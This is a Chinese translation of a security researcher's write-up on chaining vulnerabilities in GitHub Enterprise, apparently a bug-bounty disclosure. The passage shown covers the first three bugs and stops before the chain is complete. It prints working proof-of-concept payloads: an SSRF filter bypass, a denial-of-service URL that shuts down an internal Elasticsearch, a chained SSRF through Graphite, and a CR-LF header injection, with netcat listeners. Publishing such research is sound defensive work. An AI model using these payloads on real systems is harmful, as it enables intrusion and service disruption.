作者：[Orange](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html) （PI:EMAIL ）  
知道创宇404实验室 独家授权翻译
过去几个月内，我花费大量时间准备 [Black Hat USA
2017](https://www.blackhat.com/us-17/speakers/Orange-Tsai.html) 和 [DEF CON
25](https://www.defcon.org/html/defcon-25/dc-25-speakers.html) 的演讲内容。成为 Black
Hat 与 DEF CON 演讲者是我一直以来的梦想。这也是我第一次在如此正式的场合发表英文演讲。真是一次难忘的经历啊 :P
在此感谢评审委员会给我这个机会。
本文主要介绍议题中的一个简单案例。案例中提及的并非是什么新技术，关键点在于如何化腐朽为神奇！感兴趣的朋友可以浏览下面链接中的 PPT 文件，其中涵盖了包括
SSRF 在内的更多新颖技术：
  * [“SSRF新纪元：攻击前沿编程语言中的URL解析器”（A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!） ](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
接下来，我就为大家展示如何将 GitHub 企业版存在的4个漏洞整合成一个远程代码执行攻击链。
这里还要炫耀一下，此项研究荣获 GitHub 第三届年度漏洞赏金计划（GitHub 3rd Bug Bounty Anniversary
Promotion）[最佳报告](https://github.com/blog/2332-bug-bounty-third-anniversary-wrap-up)奖哦！
#### 前言
我曾在[上篇博文](http://blog.orange.tw/2017/01/bug-bounty-github-enterprise-sql-injection.html)中谈到了 GitHub 企业版这个新目标，还演示了如何对 Ruby 代码进行反混淆处理、查找 SQL
注入。文章发布没多久，我就发现几位漏洞赏金猎人已经开始关注 GitHub 企业版并挖到许多优质漏洞，例如：
  * [“铺满伪造断言的代码库之路”（The road to your codebase is paved with forged assertions）](http://www.economyofmechanism.com/github-saml) by [ilektrojohn](https://twitter.com/ilektrojohn)
  * [“GitHub企业版远程代码执行漏洞”（GitHub Enterprise Remote Code Execution）](http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html) by [iblue](https://twitter.com/iblueconnection)
看到这些文章，挫败感顿时涌上心头，挖到漏洞的人为啥不是我 :(  
痛定思痛，暗下决心，自己也要挖一个高危漏洞。  
当然，要用独特的方式！
#### 漏洞
审视 GitHub 企业版架构之前，直觉告诉我，既然 GitHub 企业版提供了这么多内部服务，进去探索一番必有收获。
于是，服务端请求伪造（SSRF）成为我的关注焦点。
##### Bug No.1 无害的 SSRF 漏洞
在体验 GitHub 企业版的过程中，我注意到一个名为 `WebHook` 的有趣功能，能通过具体 GIT 指令定义定制化 HTTP 回调。
可以根据以下 URL 创建 HTTP 回调：
    https://///settings/hooks/new
提交文件触发 URL 后，收到 GitHub 企业版发送的 HTTP 请求。负载与请求如下所示：
Payload URL:
    http://orange.tw/foo.php
Callback Request:
    POST /foo.php HTTP/1.1
    Host: orange.tw
    Accept: */*
    User-Agent: GitHub-Hookshot/54651ac
    X-GitHub-Event: ping
    X-GitHub-Delivery: f4c41980-e17e-11e6-8a10-c8158631728f content-type: application/x-www-form-urlencoded Content-Length: 8972 
    payload=... 
GitHub 企业版采用 Ruby Gem `faraday` 获取外部资源，以防用户通过Gem `faraday-restrict-ip-addresses` 发送内部服务请求。
Gem看上去像一份黑名单，可以通过[RFC
3986](https://tools.ietf.org/html/rfc3986#section-7.4)定义的稀有IP地址格式（Rare IP
Address Formats）轻松绕过。在Linux中，`0` 表示 `localhost`
PoC：
    http://0/
Ok，现在我们已经获得一个 SSRF，但由于存在某些限制，还是什么都做不了，例如：
  * 仅限 POST 方法
  * 仅允许 HTTP 与 HTTPS 方案
  * 缺少 302 重定向
  * 在 `faraday` 中缺少 CR-LF 注入
  * 无法控制 POST 数据与 HTTP 报头
目前唯一可控的是 Path 部分。
需注意此 SSRF 可导致拒绝服务（DoS）攻击。
9200 端口绑定了一项 Elasticsearch 服务。在使用 `shutdown` 命令的过程中，Elasticsearch 根本不考虑 POST
数据的具体细节。所以，不妨尽情享用 REST-ful API :P
拒绝服务（DoS）PoC：
    http://0:9200/_shutdown/
##### Bug No.2 Graphite 内部服务 SSRF 漏洞
既然已经掌握了一个 SSRF，虽然存在诸多限制，但总该有些用处吧？ 是否存在可以利用的内网服务？
这个问题涵盖的范围可不小。首先，内网中存在几项不同的 HTTP 服务，而每项服务又采用不同的语言编写，例如C、C++、Go、Python、Ruby等。
经过几天的辛苦挖掘，我在 8000 端口找到一项名为 `Graphite` 的服务。这项服务拥有一个高度可扩展的实时图形系统，而 GitHub
正是通过该系统向用户展示一些数据。
`Graphite` 采用 Python 编写，也是一个开源项目，可以在[此处](https://github.com/graphite-project/graphite-web)下载源代码！
阅读源代码后很快找到另一个SSRF漏洞。
该漏洞位于 `webapps/graphite/composer/views.py` 文件，形式十分简单。
    def send_email(request):
        try:
            recipients = request.GET['to'].split(',')
            url = request.GET['url']
            proto, server, path, query, frag = urlsplit(url)
            if query: path += '?' + query
            conn = HTTPConnection(server)
            conn.request('GET',path)
            resp = conn.getresponse()
            ...
可以看到，Graphite 在收到用户输入的 url 后直接进行获取。因此，我们可以使用首个 SSRF 触发第二个 SSRF，并将它们并入到 **SSRF
执行链** 。
SSRF 执行链负载：
    http://0:8000/composer/send_email?
    to=orange@nogg&
    url=http://orange.tw:12345/foo 
第二个 SSRF 请求：
    $ nc -vvlp 12345 
    …
    GET /foo HTTP/1.1
    Host: orange.tw:12345 Accept-Encoding: identity 
现在，我们将基于 POST 的 SSRF 改写为基于 GET 的 SSRF，但暂时还是什么都做不了。
接下来，进入下一个阶段！
##### Bug No.3 Python CR-LF 注入漏洞
可以看到，`Graphite` 使用 `httplib.HTTPConnection` 获取资源。经过若干尝试与分析，我注意到
`httplib.HTTPConnection` 中存在一个 CR-LF 注入。这样就可以在 HTTP 协议中嵌入恶意负载了。
CR-LF注入PoC
    http://0:8000/composer/send_email?
    to=orange@nogg&
    url=http://127.0.0.1:12345/%0D%0Ai_am_payload%0D%0AFoo: 
    $ nc -vvlp 12345 
    ... 
    GET /
    i_am_payload